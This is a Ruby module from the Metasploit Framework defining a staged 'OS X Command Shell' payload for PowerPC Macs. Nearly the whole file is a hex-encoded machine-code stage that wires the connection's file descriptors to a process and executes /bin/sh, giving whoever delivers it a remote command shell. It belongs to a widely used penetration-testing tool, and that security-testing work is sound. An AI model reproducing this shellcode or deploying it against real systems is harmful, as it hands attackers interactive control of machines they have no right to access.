##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OS X Command Shell',
			'Description'   => 'Spawn a command shell (staged)',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_PPC,
			'Session'       => Msf::Sessions::CommandShell,
			'Stage'         =>
				{
					'Payload' =>
						"\x38\xa0\x00\x02\x38\x00\x00\x5a\x7f\xc3\xf3\x78\x7c\xa4\x2b\x78" +
						"\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa5\xff\xff\x2c\x05\xff\xff" +
						"\x40\x82\xff\xe5\x38\x00\x00\x7e\x38\x60\x00\x00\x38\x80\x00\x00" +
						"\x44\x00\x00\x02\x48\x00\x00\x19\x38\x00\x00\x7f\x38\x60\x00\x00" +
						"\x38\x80\x00\x00\x44\x00\x00\x02\x7c\xa5\x2a\x78\x38\x00\x00\x02" +
						"\x44\x00\x00\x02\x48\x00\x00\x34\x7c\xa5\x2a\x79\x40\x82\xff\xfd" +
						"\x7c\x68\x02\xa6\x38\x63\x00\x20\x90\x61\xff\xf8\x90\xa1\xff\xfc" +
						"\x38\x81\xff\xf8\x38\x00\x00\x3b\x44\x00\x00\x02\x48\x00\x00\x0c" +
						"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x38\x00\x00\x01\x38\x60\x00\x00" +
						"\x44\x00\x00\x02\x60\x00\x00\x00"
				}
			))
	end

end
